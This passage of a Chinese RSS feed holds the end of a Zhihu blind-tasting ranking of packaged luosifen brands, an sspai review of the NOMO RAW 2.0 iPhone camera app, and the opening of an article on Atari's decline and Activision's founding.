data-original-src=\"v2-141f6ee390a66842bf78cf6984606b49\" data-watermark-src=\"v2-1b6d7d6c484e5f699a682938eb5b01f7\" data-private-watermark-src=\"v2-b9e0f2eabd183bc7accc0bab581b969f\"></p>\n<p>这碗的风格比较刺激，辣得挺爽的，有大粒的螺肉，并且处理得非常好，螺蛳的香突出，却没有明显的腥味。汤底的味道也很正宗，整体好评。如果木耳再新鲜香脆一些，就完美了。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429831115729657856\"></a><p><b>4.柳螺宗蛳</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-783c54c419262354785a04460cc35f2e_720w.jpg?rss\" data-rawwidth=\"1269\" data-rawheight=\"846\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-783c54c419262354785a04460cc35f2e\" data-watermark-src=\"v2-f3d82e7d901ebe08856bf2a8a5b13407\" data-private-watermark-src=\"v2-51aa56c562560d49ec6100b0a1b8cddb\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-7b246ba524b97bb32bbe0c68d201206f_720w.jpg?rss\" data-rawwidth=\"1268\" data-rawheight=\"713\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7b246ba524b97bb32bbe0c68d201206f\" data-watermark-src=\"v2-9650db8e8bdaf87eef88ca7b131e301d\" data-private-watermark-src=\"v2-b0cde9e7784681a74ee4838bf961d146\"></p>\n<p>口味比较温和，但味道真的不错。汤底调味层次丰富而平和，闻起也很香，是让大家都愿意喝汤的一碗螺蛳粉。酸笋好评！臭中带有一丝香甜，好好吃！配菜也很新鲜。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429831454843432960\"></a><p><b>5.螺状元</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-fe861e6645df27f61fefe566e888cb94_720w.jpg?rss\" data-rawwidth=\"1269\" data-rawheight=\"846\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-fe861e6645df27f61fefe566e888cb94\" data-watermark-src=\"v2-42227a2db91a8a73725ebe05de70671a\" data-private-watermark-src=\"v2-07fd54b19ff3d8f7e4f63f69e166a190\"></p>\n<p>有一位评委吃了几口，就猜出了品牌，因为这是她家里长期的囤货，很熟悉。闻起来有一股特别香的油味，让人忍不住喝汤。汤的层次也非常丰富，鲜甜酸平衡。粉口感特别好，Q弹香滑。配菜多而优质。酸豆角和酸笋都是香香脆脆的很好吃，腐竹和花生也都很新鲜，香香脆脆的。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429831864769523712\"></a><p><b>6.马中才</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f6588a2efca1782b2433735708658891_720w.jpg?rss\" data-rawwidth=\"1269\" data-rawheight=\"846\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f6588a2efca1782b2433735708658891\" data-watermark-src=\"v2-c8e5194c116b35b4b665592fa07e80a6\" data-private-watermark-src=\"v2-c681d32e03698de4ae4be8f177b1274f\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f4f017c69b92a9f01da85fc0052288e4_720w.jpg?rss\" data-rawwidth=\"1268\" data-rawheight=\"713\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f4f017c69b92a9f01da85fc0052288e4\" data-watermark-src=\"v2-9e0f7d3abc0d5989158a2f030e6faf50\" data-private-watermark-src=\"v2-6891c7a0d9480c6e007df047d9cefca8\"></p>\n<p>唯独一碗有超大螺肉的螺蛳粉，引来的评委团的惊呼和争抢。腐竹也是比较特别的大片，泡在汤里超级诱人，一口吃下去也够味。汤底是咸鲜口，整体不错。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429832228671492096\"></a><p><b>7、凤张螺蛳粉</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-3e2563b769c9ea149b3c62d970d41ded_720w.jpg?rss\" data-rawwidth=\"1269\" data-rawheight=\"846\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3e2563b769c9ea149b3c62d970d41ded\" data-watermark-src=\"v2-ae568098438b0ddc1b6f070e60b6e49b\" data-private-watermark-src=\"v2-de8d43994890ddd951521e00c0f886b2\"></p>\n<p>一端上来就被惊呼“好香！”仔细一看是因为有<b>【油葱】</b>，油葱的香味和螺蛳粉的“臭”超级搭配，加分！柳州当地很多家老牌螺蛳粉都有加，不知道为什么包装螺蛳粉大多数都没有。建议都向这一家学习！加油葱！！！</p>\n<p><b>8.好欢螺原味</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-55e8e8eefcbebae05705b50b467d8961_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"2000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-55e8e8eefcbebae05705b50b467d8961\" data-watermark-src=\"v2-f44ec87776838bd53be4f11bffee0ed2\" data-private-watermark-src=\"v2-8662b9e8ce905b83d1d418c2265b3106\"></p>\n<p>汤底咸、甜、鲜，整体味道搭配得非常和谐，汤底里小小的螺肉是个惊喜，瞬间被大家抢光。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429833891989913601\"></a><p><b>9.螺霸王麻辣味</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-0b9b3927f7296f53c01d09cd22427eaf_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1333\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0b9b3927f7296f53c01d09cd22427eaf\" data-watermark-src=\"v2-a90a19476d55339dd5d0eb75cb48bdb8\" data-private-watermark-src=\"v2-7dc8fb6d0e41967dea83d9f2695b6168\"></p>\n<p>非常适合重口味深度螺蛳粉爱好者！汤底咸鲜酸辣非常够味！酸笋够酸够臭，喜欢螺蛳粉的人会觉得是香香的，配菜很丰富，除了腐竹，还特别加了【蛋白条】，有点像我们平时吃的豆棍，在汤里泡一泡再吃，会超级入味。螺蛳粉爱好者必入。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429834453123891200\"></a><p>10.螺霸王原味</p>\n<p><img src=\"https://pic2.zhimg.com/v2-39733dd05207bf6ccc227703f2000b2c_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"2000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-39733dd05207bf6ccc227703f2000b2c\" data-watermark-src=\"v2-df57fb046f770fb36a6659c445571391\" data-private-watermark-src=\"v2-093b1f4053959c848848128ac5183624\"></p>\n<p>粉入口感觉超棒，Q弹又细滑，汤底鲜香，所有配菜的品质都很高，花生腐竹新鲜又香脆，酸笋甜脆甜脆的，很好吃。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429834939974381568\"></a><p>11.李子柒原味</p>\n<p><img src=\"https://pic4.zhimg.com/v2-beff32e6971e0746e1881d2c65af30c6_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"2000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-beff32e6971e0746e1881d2c65af30c6\" data-watermark-src=\"v2-465255645311aec446c44bc40de60c61\" data-private-watermark-src=\"v2-a365d4c67c507cb3dff5be49a7d22d68\"></p>\n<p>汤底层次丰富，非常鲜，并且不会过咸。配菜丰富，该有的都有，腐竹超级多！这点特别赞！并且花生也很香脆。有两位重口味评委不太满意，但综合而言，这是一款品控相当优秀，并且适合大众口味的螺蛳粉。</p>\n<p>在网上看到过很多说李子柒难吃的文章，个人觉得蛮奇怪的。身边本来就有很多朋友爱吃，这次我们盲吃，也把它给选出来了。难道是被很多人黑？？？</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429835811169136640\"></a><p><b>12.拾光悠味</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-8c2650b277705da43405e6c896070591_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"2000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8c2650b277705da43405e6c896070591\" data-watermark-src=\"v2-b119c24b95697b9dfcc6b5d7afe0e134\" data-private-watermark-src=\"v2-1698edf5eed22208cd1fe99fdf2d515f\"></p>\n<p>算是一款脱颖而出的不知名品牌。汤底喝起来回味满满，咸鲜香平衡得恰到好处。配菜整体新鲜度都很棒，花生香香脆脆、腐竹饱满入味，酸笋有一点点过酸，不过总体评分也算是很优秀了！</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429836382793125889\"></a><p><b>13.小新有炸</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c81fc2a49fbc20546c0742d85fb5c55f_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"2000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-c81fc2a49fbc20546c0742d85fb5c55f\" data-watermark-src=\"v2-8328bfafaa4efe8154606842cb7015aa\" data-private-watermark-src=\"v2-39377e786c170f432821b0bf1230288e\"></p>\n<p>这个牌子的配菜很丰富，酸笋嚼起来很过瘾，嘎嘣脆。汤底也浓厚有回味，香香辣辣，微甜。并且里面还有口感有韧劲的螺蛳，就更加分。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429836746419306496\"></a><p><b>14.锅圈食汇</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-ae7013f3ea5b1614852ec1cb5e2df23c_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"2000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ae7013f3ea5b1614852ec1cb5e2df23c\" data-watermark-src=\"v2-7f2281f320c84aa637056733718337f4\" data-private-watermark-src=\"v2-44f2635a0eae35e7bf9e1f1859dc3314\"></p>\n<p>汤底多了一层特别的焦香味，所有评委都注意到了这一点，有人说像像糊辣椒的香，有人说像胡椒的香，总之香味很特别也很抢戏。味道层次丰富、偏酸偏甜。是比较特别的一款螺蛳粉，值得一试。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429837172879257600\"></a><p>15.吉吉咔</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c9bd96324ccc0e784fd09686f9664e17_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"2000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-c9bd96324ccc0e784fd09686f9664e17\" data-watermark-src=\"v2-0f4c32a9b2301a70d11fd26797da6604\" data-private-watermark-src=\"v2-5a3cd454b4640b60f5c4959240fad7ec\"></p>\n<p>除了螺蛳粉特有的香味，还多了一层川味火锅的香，汤底的层次很和谐，评委们纷纷表示非常过瘾。粉稍微偏细，但也还算Q弹。价格也很实惠。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429837619551756288\"></a><p><b>接下来就是残忍的【拉黑避雷榜】，几乎都是毫无可吃性，很奇怪为什么会有一些网红品牌也在其中。但没办法，这里必须展示出评委们的主观感受：</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-24f8d8b224293d3749f4010b2d332596_720w.jpg?rss\" data-rawwidth=\"3675\" data-rawheight=\"2882\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-24f8d8b224293d3749f4010b2d332596\" data-watermark-src=\"v2-e4496be176fd7daf9782166c1e4f3705\" data-private-watermark-src=\"v2-a3c6df6512c81a217a5f0229564e862a\"></p>\n<p><b>【可以试一试榜单】中的品牌和味道，虽然并不最出色，但整体尚可。</b></p>\n<p><b>其中一些品牌也各有亮点，大家可以根据自己的喜好，选择尝试：</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-0043e7ad2742d677799ab7f0cc2d5c06_720w.jpg?rss\" data-rawwidth=\"3675\" data-rawheight=\"2434\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0043e7ad2742d677799ab7f0cc2d5c06\" data-watermark-src=\"v2-110e1c8559d08b3c1924712f9d05a78e\" data-private-watermark-src=\"v2-3c2038841e7aff9d4ce4f7ef34d74d5d\"></p>\n<h2>分享花式吃法：</h2>\n<p>回家之后，我捯饬了好几顿，研究出了一包螺蛳粉打开新世界的N种DIY吃法！还召集嗦粉爱好者们开了个螺蛳粉party，朋友们赞叹连连，亲测好吃，分享给大家，建议收藏！！</p>\n<p><b>最具本地风味版：加溏心荷包蛋、空心菜、油葱</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-ff5599ecd7762513f9bce8bac3b4a235_720w.jpg?rss\" data-rawwidth=\"1268\" data-rawheight=\"845\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ff5599ecd7762513f9bce8bac3b4a235\" data-watermark-src=\"v2-421719c43b657e683018f7b8379a46e9\" data-private-watermark-src=\"v2-478d21dd85584222bc36411397b6374c\"></p>\n<p>当地店里的螺蛳粉，加上一个溏心荷包蛋，荷包蛋混合螺蛳粉汤汁的香味，真的超！！级！！绝！！</p>\n<p>强烈推荐一试！油葱自己在家炸就行，小火用油把小葱炸焦就好，是个大大的加分项，空心菜又是必不可少，加上这三种料，就可以说是一碗非常具有本地风味的螺蛳粉了。</p>\n<p><b>敲豪华DIY版：金针菇、午餐肉、牛肉卷</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-21304aea8834d712326a498f39777bcd_720w.jpg?rss\" data-rawwidth=\"1268\" data-rawheight=\"845\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-21304aea8834d712326a498f39777bcd\" data-watermark-src=\"v2-5aeefcf71f7bdeaa96e3192d8047548c\" data-private-watermark-src=\"v2-676f0545e2d8012e56e87edc2fcf5210\"></p>\n<p>试过很多种配菜，这几种加进去最有幸福感，因为午餐肉和牛肉卷，都是特别入味的。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-92f61721470c0744ff7f8f37b8040a00_720w.jpg?rss\" data-rawwidth=\"1268\" data-rawheight=\"845\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-92f61721470c0744ff7f8f37b8040a00\" data-watermark-src=\"v2-39ed9f020836455e0b95367b408d448a\" data-private-watermark-src=\"v2-9a1e8a467ba266c0c9d422b95fc38959\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-adad3cfc0c556a2561e93e0401858d7c_720w.jpg?rss\" data-rawwidth=\"1268\" data-rawheight=\"845\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-adad3cfc0c556a2561e93e0401858d7c\" data-watermark-src=\"v2-02e1ba057d4bee0a96d376a72228ba85\" data-private-watermark-src=\"v2-948d670d2022ab354dc1a21434034d2b\"></p>\n<h3>写在最后：</h3>\n<p>煮了一百多碗粉，又去了趟柳州。简直打开了螺蛳粉的新世界！本以为会吃到想吐，吃完所之后会对螺蛳粉再也爱不起来，谁知道却因为它极具碰撞的味觉层次，而入坑更深了！！</p>\n<p>正宗螺蛳粉的汤底<b>，以猪骨和螺蛳熬制出的浓郁汤头，又有八角、桂皮、丁香、辣椒诸多香料的烘托，显得回味无穷。出锅之后还要浇上一大勺白醋和红彤彤的辣椒油。酸笋、黑木耳、酸豆角的爽脆，搭配米粉Q弹又绵软的口感，再来一口腐竹吸满汤汁的麻辣清香。这种</b>极具生命力的味觉碰撞，让人久吃不腻。</p>\n<p>我想螺蛳粉能被大多数人喜爱，成为<b>【粉届顶流】</b>，既是偶然，也是必然吧！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/pi-pi-de-dan-dan-66?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Bonnie的小皮皮</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/38206053/answer/2160266807?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">555 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/320471653?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">淘宝上的螺蛳粉好吃，求推荐哇？</a><br><a href=\"http://www.zhihu.com/question/437881424?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">淘宝上的螺蛳粉哪家的好吃？</a><br>\n","link":"http://www.zhihu.com/question/38206053/answer/2160266807?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"在 iPhone 上还原相机体验，让「拍好照片」变得更简单：NOMO RAW 2.0","date":"2021-10-08 07:30:00","description":"\n<p>借着 iPhone 13 Pro 系列和 iOS 15 正式发布的东风，NOMO RAW 在近日也更新了 2.0 大版本，新版主要是新增了一个 ProRAW 编辑器，这也就意味着我可以像使用相机一样来使用 NOMO RAW，在拍照的时候只需要专注于「构图」，后期的所有事情都可以在拍摄结束后再一一调整。</p>\n<p>如果你和我一样是一名手机摄影爱好者，并且恰好你使用的手机是 iPhone 12 Pro 系列或者 iPhone 13 Pro 系列，那么你一定要尝试一下 NOMO RAW，因为它赋予了 iPhone 摄影更加强大的功能，不管是日常记录还是专业拍摄，都能获得绝佳的创作体验。</p>\n<h2>先拍后调，不错过每一个精彩的瞬间</h2>\n<p>借助于 Apple ProRAW 格式，NOMO RAW 在相机界面的左上角打开 RAW 开关后，有充分的后期空间对拍好的照片进行调整。2.0 版本新增的这个 ProRaw 编辑器，采用了 16-bit 的全流程色彩管线，极大程度地降低了在各个环节中色彩失真或丢失的问题，可以对照片从画幅比例、色彩方案、曝光（RAW）、色温（RAW）、色调（RAW）、锐化（RAW）、阴影（RAW）、高光、对比度、饱和度、胶片颗粒、暗角等多达 11 项进行调整。</p>\n<p>根据 <a href=\"https://m.weibo.cn/status/4687547404387730\" target=\"_blank\">飞猪老师的介绍</a>，其中有 5 项标注了是专门针对 RAW 格式的照片来进行的，比如说曝光调整，就是按照标准的 EV 标定，对 ProRAW 文件进行重新解析，也就是说在不超过动态范围的情况下，它和我在拍摄时调整曝光的结果，是没有区别的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/06/2ee9ca3fd152a79ddd493c18b3e7f578.JPEG\"></figure><p>在「编辑图片」界面的右下角，可以看到一个放大镜一样的图标，这其实是一个「放大镜」辅助工具，灵感来自胶片摄影中的「观片器」，可以对照片从 200% 到 1:1 进行放大，方便我在观察照片细节的同时也可以兼顾整张照片的观感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/06/7dd6042c79fdb7d53d181d98be0fee05.JPEG\"></figure><p>得益于强大的 ProRAW 编辑器，我使用 NOMO RAW 拍照的流程就发生了变化，我只需要打开 App、选好焦距、调整身位、找好角度，然后按下快门即可，等所有拍摄完成后，再坐下来对照片进行精细的调整。</p>\n<h2>色彩管理，让手机也能拍出胶片质感</h2>\n<p>在 ProRAW 编辑器中有一项针对 RAW 格式照片的锐化选项，NOMO RAW 基于 ProRAW 原始信息保存的大量信息，将细节信号、局部反差、明度噪声、边缘反差等数据，全部重新处理过之后，可以呈现出来在视觉上更加「锐利」的图片效果。</p>\n<p>通过前面提到的「放大镜」辅助工具，我们可以在下面两张相同的照片中看出明显的区别，其中左侧是去掉了所有机内锐化的效果，右侧是将锐化拉到 20，从右侧的照片中可以看到细节更加丰富的绒毛。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/06/3580c7aa6e32722001148eadfa436a6b.JPEG\"><figcaption>建议点开大图观看</figcaption></figure><p>NOMO RAW 这个「RAW 锐化」功能不是空穴来风，而是为了服务于自己的胶片色彩方案。用过 NOMO CAM 的朋友一定知道这个产品中已经呈现出了非常多胶片模拟的色彩风格，现在这些色彩风格又重新来到了 NOMO RAW 上。</p>\n<p>不过，与 <a href=\"https://sspai.com/app/NOMO%20CAM\" target=\"_blank\">NOMO CAM</a> 中浓墨重彩的胶片模拟不同，在 NOMO RAW 中的胶片模拟，更「淡雅」一些，表现了比较「专业向」的胶片扫描质感。当我把「RAW 锐化」拉到 20 时，照片的整体效果就会非常像扫描胶片时候，扫描仪机内的「锐化」质感。</p>\n<p>这次 NOMO RAW 在 2.0 版本新增了 9 款不同的色彩方案，包括了：</p>\n<ul>\n<li>f1: Fujicolor Pro 160C</li>\n<li>f3: F-CP TYPE3510</li>\n<li>f4: Fujicolor Superia 400</li>\n<li>k1: Kodak Portra 160</li>\n<li>k2: KODAK VISION 2382</li>\n<li>k4: Kodak Portra 400</li>\n<li>a1: Agfa Portrait 160</li>\n<li>a4: AgfaPhoto Vista 400</li>\n<li>x4: Kodak Tri-X 400</li>\n</ul>\n<p>其中，我最喜欢的要数 f1: Fujicolor Pro 160C、f3: F-CP TYPE3510 和 k4: Kodak Portra 400，它们在拍摄建筑、风光和食物时可以展现出非常棒的质感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/06/c531dc5b5198e2deb5d2103b78f6d61b.JPEG\"></figure><h2>版本管理，和选择恐惧症说再见</h2>\n<p>「版本管理」是另外一个非常实用的功能，可以帮助像我这样对色彩没有直觉天赋的人解决选择困难的问题。在 NOMO RAW 中，不管是针对画幅比例、色彩方案还是参数的调整，都可以记录为一个单独的版本或者覆盖原有的版本。</p>\n<p>每次拍完一张照片，NOMO RAW 都会在版本记录中自动生成一个 RAW 版本和一个附带色彩方案的版本，这时候在系统相册里只能看到一张照片。</p>\n<p>这个时候，如果我修改 RAW 版本，那么无法选择「更新图片」，只能选择「保存副本」，这样一来版本记录里就会多一个新的版本，系统相册里也会多一张新的照片；如果我修改附带色彩方案的版本，那么我选择「更新图片」后就会覆盖掉原来的版本，同时系统相册里的那种照片也会被覆盖，如果我选择「保存副本」，那么和前面一样，版本记录里就会多一个新的版本，系统相册里也会多一张新的照片。听起来可能有点绕口，但认真理一下就会发现这是符合逻辑的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/06/284faab6169f79a65649bf7415510bf1.JPEG\"></figure><p>在实际使用的过程中，我会针对同一张照片做好不同风格的调整，然后在「版本管理」中保存为不同的副本，初步筛选时先删掉不需要的版本，然后再经过比对筛选出自己最喜欢的那张照片，通过星标功能设为封面，这样在 NOMO RAW 和系统相册中我都可以直接看到喜欢的那个版本。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/06/2cbb0962fa7ea22f8b5cd75c11e4aab9.JPEG\"></figure><h2>后记</h2>\n<p>手机摄影何时能取代相机？这个话题由来已久，但我不想再这里讨论。我只感受到随着手机硬件和摄影软件的提升，比如说 iPhone 13 Pro 系列和 NOMO RAW，确实给我们用镜头去记录生活提供了一种更加方便和灵活的方式，这也正是我心中手机摄影最正确的打开方式，它不需要做到「最好」，只需要「够好」。</p>\n<p>你可以在 <a href=\"https://apps.apple.com/cn/app/nomo-raw-%E4%B8%93%E4%B8%9A-proraw-%E7%9B%B8%E6%9C%BA/id1572429540\" target=\"_blank\">App Store</a> 下载 NOMO RAW，年订阅价格 98 元，NOMO CAM 订阅用户可以免费获取 NOMO RAW。</p>\n<span class=\"ss-application\" app-id=\"16098\"> </span><p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69124"},{"title":"雅达利是怎么把自己「折腾至死」的？","date":"2021-10-08 06:33:44","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>20 世纪 80 年代是一个全世界都在「折腾」的年代，方兴未艾的游戏业界也不例外。80 年代初，债台高筑的任天堂折腾出了 Game &amp; Watch 和 FC 红白机，不但一举扭转颓势，并且开始大举进军家用游戏机行业，夸下了「两年卖出三百万台」的海口 —— 尽管全日本当年的家用游戏机总销量都还没达到这个数字。虽然山内溥的发言在任天堂社内也被当成疯话，但是相对于大洋彼岸的游戏机巨头雅达利来说，这种「折腾」的「格局」显然还是小了点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5au0ilb34teh5fkveag.jpeg\"><figcaption>Atari 2600 的装机量庞大到每三个美国家庭就拥有一台该型游戏机。</figcaption></figure><h2>「旧日支配者」的「格局」有多大？</h2>\n<p>作为二十世纪七八十年代游戏业界的绝对统治者，雅达利从街机起家，后凭借着 Atari 2600 成功闯入并迅速占领了北美大陆的家用游戏机市场 （<s>依靠自家街机业务输血熬死了其他竞争对手 </s> ），公司市值从 3000 万美元一度膨胀至 32 亿美元，好不风光。</p>\n<p>起初，雅达利主要依靠移植自家的街机游戏来扩张游戏阵容，然而可移植的游戏数量毕竟有限，很快雅达利就开始组建一支专为 Atari 2600 制作游戏的开发团队。看起来，雅达利似乎已经站在了游戏业界的「风口」，拿到了软件行业的第一手「头部资源」，以游戏开发为「抓手」，以自家的街机移植作品为「护城河」，建立起了自家产品的「生态闭环」，实施了对友商产品的「降维打击」，重新制定了家用游戏机的「行业打法」，在游戏开发到发行的过程中实现了「端到端的短、平、快式处理」，进入了某种良性循环。<s> 当代互联网大厂直呼内行 。</s></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5au0itb34teit0pmrlg.png\"><figcaption>雅达利为 Atari 2600 平台推出的游戏数量繁多，这其中也包括少数以买断形式发售的第三方游戏。</figcaption></figure><p>互联网黑话说多了早晚要倒霉的，而雅达利的所作所为可比这些所谓的「黑话」还要黑得多。得益于自身的强大财力和无与伦比的市场号召力，Atari 2600 的游戏开发进程相当顺风顺水 —— 当然，这只是对雅达利而言。在突飞猛进的业绩之下，是雅达利对软件开发部门近乎「残忍」的层层盘剥。</p>\n<h3>「臭写代码的，上雅达利要饭来了？」</h3>\n<p>1980 年，雅达利的创始人诺兰·布什内尔（Nolan Bushnell）已经离开，时任雅达利 CEO 的是从母公司时代华纳空降而来的雷蒙·凯撒（Raymond Kassar），作为一个老美利坚、正星条旗的职业经理人，凯撒是一个不折不扣的实业家，却不是一个懂得和尊重技术的人。众所周知，「DC 最大的敌人是华纳」，而这句话套用到雅达利身上也同样合适。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c5au0j5b34teh3cl8md0.jpeg\"><figcaption>雅达利的崩溃与雷蒙·凯撒唯利是图的商业策略脱不了干系。</figcaption></figure><p>为了保证雅达利在游戏软件上的数量优势和内容独占，凯撒对软件开发部门的压榨不能说是毫无人性，至少也可以说是惨绝人寰。凯撒自打内心深处就瞧不起这些为雅达利呕心沥血的开发人员，认为他们只是一群会敲打键盘的嬉皮士。他要求开发人员夜以继日地工作，连最基本的休息时间都被压缩到最低限度，而开发者却不能从自己制作的游戏中获得半点好处，甚至都不能在包装上拥有自己的姓名。在精神和肉体的双重摧残下，越来越多的开发者表现出了自己的不满。</p>\n<h3>「那我走？」</h3>\n<p>从雅达利出走的「嬉皮士」中不乏极具冒险精神和创新思维的人。在离职的愤怒和沮丧之后，大卫·克雷恩（David Crane）、拉里·卡普兰（Larry Kaplan）、阿兰·米勒（Alan Miller）和鲍勃·怀特海德（Bob Whitehead）这四位雅达利的前工具人迅速达成了共识，他们的对话可以被浓缩成以下内容：</p>\n<blockquote>\n<p><i>「靠我们自己，能不能挣钱？」</i></p>\n<p><i>「能挣，家里。」</i></p>\n<p><i>「靠开发游戏，能不能挣钱？」</i></p>\n<p><i>「能挣，跪着。」</i></p>\n<p><i>「我们自己开发游戏，能不能站着把钱给挣了？」</i></p>\n</blockquote>\n<p>于是，几位快被雅达利薅秃了的程序员把心一横，决定反过来狠狠薅雅达利一把羊毛。就这样，今天为人所熟知的动视（Activision）在 1979 年正式成立。<strong>作为史上首个第三方游戏发行商，动视打破了「硬件制造商包办软件发行」的行业规则</strong>，于雅达利之外独立发行自己开发的 Atari 2600 游戏，借机瓜分雅达利的软件利润。动视开发的游戏本身素质过硬，加之蹭到了雅达利垄断之下的庞大市场，动视在成立后的不久就赚的盆满钵满，这很快引起了「老东家」的关注。</p>\n<h2>「旧日支配者」的「气度」有多小？</h2>\n<p>早在 1980 年 1 月的 CES 